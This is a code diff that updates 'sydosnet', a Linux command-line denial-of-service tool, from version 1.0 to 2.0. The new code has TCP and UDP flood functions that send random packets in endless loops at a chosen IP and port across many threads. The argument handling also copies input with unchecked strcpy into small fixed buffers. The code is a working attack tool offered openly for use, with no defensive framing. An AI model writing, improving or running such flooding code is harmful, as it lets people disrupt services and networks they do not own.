@@ -1,80 +1,76 @@
 /* SyDosnet is Linux only */
 
 #include<iostream>
+#include<unistd.h>
 #include<cstring>
-#include<ctime>
-#include"lib/dosapi.hpp"
+#include<thread>
+#include<sys/socket.h>
+#include<sys/types.h>
+#include<arpa/inet.h>
 
-enum METHOD { METHOD_TCP = 0, METHOD_SYN = 1, METHOD_UDP = 2, METHOD_NULL = -1 };
+char target_ip[16]{0};
+int target_port = 0;
+int attack_thread = 0;
+char attack_method[4]{0};
 
-int attack(const char* ip, int port, const char* packet, int thread, int method)
+void tcpflood()
 {
-    std::cout << " checking method " << std::endl;
-    if(method != METHOD_NULL)
-    {
-        if(method == METHOD_TCP)
-        {
-            std::cout << " start tcp flood " << std::endl;
-            for(int i = 0; i < thread; i++) {
-                std::thread(tcpflood, ip, port, packet).detach();
-                usleep(300 * 1000);
-            }
+    sockaddr_in target{0};
+    target.sin_family = AF_INET;
+    target.sin_addr.s_addr = inet_addr(target_ip);
+    target.sin_port = htons(target_port);
 
-            return METHOD_TCP;
-        }
+    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    connect(sock, reinterpret_cast<sockaddr*>(&target), sizeof(sockaddr_in));
 
-        else if(method == METHOD_SYN)
-        {
-            std::cout << " start syn flood " << std::endl;
-            for(int i = 0; i < thread; i++) {
-                std::thread(synflood, ip, port).detach();
-                usleep(300 * 1000);
-            }
-
-            return METHOD_SYN;
-        }
-
-        else if(method == METHOD_UDP)
-        {
-            std::cout << " start udp flood " << std::endl;
-            for(int i = 0; i < thread; i++) {
-               std::thread(udpflood, ip, port, packet).detach();
-               usleep(300 * 1000);
-               
-            }
-
-            return METHOD_UDP;
-        }
+    char packet[1024]{0};
+    for(int i = 0; i < 1024; i++) {
+        packet[i] = rand();
     }
 
-    return METHOD_NULL;
+    while(true) {
+        send(sock, packet, sizeof(packet), 0);
+    }
 }
 
-int checkmethod(const char* method)
+void udpflood()
 {
-    if(strcmp(method, "tcp") == 0) {
-        return METHOD_TCP;
+    sockaddr_in target{0};
+    target.sin_family = AF_INET;
+    target.sin_addr.s_addr = inet_addr(target_ip);
+    target.sin_port = htons(target_port);
+
+    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+
+    char packet[1024]{0};
+    for(int i = 0; i < 1024; i++) {
+        packet[i] = rand();
     }
 
-    else if(strcmp(method, "syn") == 0) {
-        return METHOD_SYN;
+    while(true) {
+        sendto(sock, packet, sizeof(packet), 0, reinterpret_cast<sockaddr*>(&target), sizeof(sockaddr_in));
+    }
+}
+
+void create_thread()
+{
+    if(strcmp(attack_method, "tcp") == 0) {
+        for(int i = 0; i < attack_thread; i++) {
+            std::thread(tcpflood).detach();
+            usleep(300 * 1000);
+        }
     }
 
-    else if(strcmp(method, "udp") == 0) {
-        return METHOD_UDP;
+    else if(strcmp(attack_method, "udp") == 0) {
+        for(int i = 0; i < attack_thread; i++) {
+            std::thread(udpflood).detach();
+            usleep(300 * 1000);
+        }
     }
-
-    return METHOD_NULL;
 }
 
 int main(int argc, char** argv)
 {
-    char ip[16] = "null";
-    char packet[1024] = "null";
-    int port = 0;
-    int thread = 0;
-    int method = METHOD_NULL;
-
     for(int i = 1; i < argc; i++)
     {
         /* Show Version */
@@ -82,7 +78,7 @@ int main(int argc, char** argv)
         {
             std::cout << "                                                                " << std::endl;
             std::cout << " |                        | version |                         | " << std::endl;
-            std::cout << " |                   sydosnet v1.0 release                    | " << std::endl;
+            std::cout << " |                   sydosnet v2.0 release                    | " << std::endl;
             std::cout << " |                      made by SeungYup                      | " << std::endl;
             std::cout << " |                                                            | " << std::endl;
             std::cout << " |       Update: https://github.com/seungyup26/sydosnet       | " << std::endl;
@@ -105,8 +101,6 @@ int main(int argc, char** argv)
             std::cout << " |                  --port  set target port                   | " << std::endl;
             std::cout << " |                -th,                                        | " << std::endl;
             std::cout << " |                  --thread  set attack thread               | " << std::endl;
-            std::cout << " |                -pk,                                        | " << std::endl;
-            std::cout << " |                  --packet  set attack packet               | " << std::endl;
             std::cout << " |                -m,                                         | " << std::endl;
             std::cout << " |                  --method  set attack method               | " << std::endl;
             std::cout << " |                                                            | " << std::endl;
@@ -119,71 +113,47 @@ int main(int argc, char** argv)
 
         /* Set Target IP */
         else if(strcmp(argv[i], "-i") == 0 || strcmp(argv[i], "--ip") == 0) {
-            std::cout << " setting target ip... ";
-            strcpy(ip, argv[i+1]);
-            std::cout << " done " << std::endl;
+            strcpy(target_ip, argv[i+1]);
         }
 
         /* Set Target Port */
         else if(strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "--port") == 0) {
-            std::cout << " setting target port ... " << std::endl;
-            port = atoi(argv[i+1]);
-            std::cout << " done " << std::endl;
-        }
-
-        /* Set Attack Packet */
-        else if(strcmp(argv[i], "-pk") == 0 || strcmp(argv[i], "--packet") == 0) {
-            std::cout << " setting attack packet " << std::endl;
-            strcpy(packet, argv[i+1]);
-            std::cout << " done " << std::endl;
+            target_port = atoi(argv[i+1]);
         }
 
         /* Set Attack Thread */        
         else if(strcmp(argv[i], "-th") == 0 || strcmp(argv[i], "--thread") == 0) {
-            std::cout << " setting attack thread " << std::endl;
-            thread = atoi(argv[i+1]);
-            std::cout << " done " << std::endl;
+            attack_thread = atoi(argv[i+1]);
         }
 
         /* Set Attack Method */
-        else if(strcmp(argv[i], "-m") == 0 || strcmp(argv[i], "--method") == 0) {
-            std::cout << " setting attack method " << std::endl;
-            method = checkmethod(argv[i+1]);
+        else if(strcmp(argv[i], "-m") == 0 || strcmp(argv[i], "--method") == 0)
+        {
+            strcpy(attack_method, argv[i+1]);
         }
     }
 
     /* IP is null */
-    if(strcmp(ip, "null") == 0) {
+    if(strcmp(target_ip, "") == 0) {
         std::cout << " E: target ip address is null " << std::endl;
         return 1;
     }
 
     /* Port is null */
-    if(port == 0) {
+    if(target_port == 0) {
         std::cout << " E: target port is null " << std::endl;
         return 1;
     }
 
     /* Thread is null */
-    if(thread == 0) {
+    if(attack_thread == 0) {
         std::cout << " E: attack thread is null " << std::endl;
         return 1;
     }
 
-    /* Packet is null */
-    if(strcmp(packet, "null") == 0 && method != METHOD_SYN)
-    {
-        std::cout << " W: random packet " << std::endl;
-        for(int i = 0; i < 1024; i++) {
-            packet[i] = rand();
-        }
-    }
+    create_thread();
 
-    std::cout << " attack start " << std::endl;
-    attack(ip, port, packet, thread, method);
-
-    std::cout << " attack to " << ip << ":" << port << std::endl;
-    std::cout << " press ctrl+c or any enter to exit ... " << std::endl;
+    std::cout << " press ctrl+c or enter key to exit ... " << std::endl;
 
     std::cin.get();
     return 0;
